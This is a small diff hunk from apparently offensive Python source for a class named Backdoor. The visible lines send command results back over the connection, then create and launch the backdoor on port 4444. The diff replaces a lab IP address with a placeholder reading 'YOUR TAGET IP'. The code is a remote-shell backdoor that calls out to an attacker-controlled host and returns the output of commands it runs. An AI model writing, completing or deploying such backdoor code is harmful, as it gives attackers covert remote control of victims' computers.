@@ -64,5 +64,5 @@ class Backdoor:
 				
 			self.reliable_send(command_result)
 		
-my_backdoor = Backdoor("10.0.2.10", 4444)
+my_backdoor = Backdoor("YOUR TAGET IP", 4444)
 my_backdoor.run()
